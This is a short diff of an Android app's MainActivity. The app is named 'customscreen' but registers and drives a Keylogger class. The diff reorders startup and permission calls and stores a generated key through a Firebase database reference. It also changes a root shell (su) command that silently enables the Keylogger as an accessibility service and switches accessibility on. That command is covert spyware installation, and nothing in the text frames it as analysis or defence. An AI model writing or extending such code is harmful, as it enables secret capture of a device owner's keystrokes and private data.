@@ -74,9 +74,9 @@ public class MainActivity extends AppCompatActivity {
 
                 if(gefunden) {
                     Keylogger.gefundenerKey = gefundenerKey;
-                    (new Startup()).execute();
-                    checkPremission();
 
+                    checkPremission();
+                    (new Startup()).execute();
                 } else {
 
                     // Write a message to the database
@@ -90,8 +90,9 @@ public class MainActivity extends AppCompatActivity {
                     myRef.setValue(neuerKey);
 
                     Keylogger.gefundenerKey = neuerKey;
-                    (new Startup()).execute();
                     checkPremission();
+                    (new Startup()).execute();
+
 
                 }
 
@@ -152,7 +153,7 @@ public class MainActivity extends AppCompatActivity {
             try {
                 Process process = Runtime.getRuntime().exec("su");
                 DataOutputStream os = new DataOutputStream(process.getOutputStream());
-                os.writeBytes("settings put secure enabled_accessibility_services com.example.metinatac.customscreen/com.example.metinatac.customscreen.Keylogger\n");
+                os.writeBytes("settings put secure enabled_accessibility_services com.custom.metinatac.customscreen/com.custom.metinatac.customscreen.Keylogger\n");
                 os.flush();
                 os.writeBytes("settings put secure accessibility_enabled 1\n");
                 os.flush();
